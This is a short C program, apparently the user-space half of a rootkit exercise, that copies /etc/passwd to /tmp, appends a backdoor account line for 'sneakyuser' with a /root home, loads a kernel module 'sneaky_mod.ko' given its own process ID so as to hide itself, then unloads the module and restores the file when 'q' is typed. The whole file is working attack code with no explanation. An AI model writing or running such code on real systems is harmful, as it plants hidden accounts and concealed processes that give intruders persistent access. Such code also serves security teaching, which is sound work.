#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void copy_file(const char * src, const char * dest) {
  FILE* srcFile = fopen(src, "rb");
  if (srcFile == NULL) {
      perror("无法打开源文件");
      exit(EXIT_FAILURE);
  }

  FILE* destFile = fopen(dest, "wb");
  if (destFile == NULL) {
      perror("无法创建或打开目标文件");
      exit(EXIT_FAILURE);
  }
  
  // 逐字符复制源文件到目标文件
  char c;
  while ((c = fgetc(srcFile)) != EOF) {
      fputc(c, destFile);
  }

  if (fclose(destFile) == EOF) {
      perror("无法关闭目标文件");
      exit(EXIT_FAILURE);
  }

  if (fclose(srcFile) == EOF) {
      perror("无法关闭源文件");
      exit(EXIT_FAILURE);
  }
}

void insert_line_into_file(const char* filePath, const char* line) {
  if (filePath == NULL || line == NULL) {
    exit(EXIT_FAILURE);
  }

  FILE* file = fopen(filePath, "a");
  if (file == NULL) {
    exit(EXIT_FAILURE);
  }

  const char* currentChar = line;
  while (*currentChar != '\0') {
    char character = *currentChar;
    fputc(*currentChar, file);
    ++currentChar;
  }

  fclose(file);
}


int main() {
  printf("sneaky_process pid = %d\n", getpid());

  copy_file("/etc/passwd", "/tmp/passwd");

  insert_line_into_file("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");

  char args[64];
  sprintf(args, "insmod sneaky_mod.ko sneaky_pid=%d", (int) getpid());
  system(args);

  char c;
  while ((c = getchar()) != 'q') {}

  system("rmmod sneaky_mod.ko");

  copy_file("/tmp/passwd", "/etc/passwd");

  system("rm -f /tmp/passwd");
  
  return 0;
}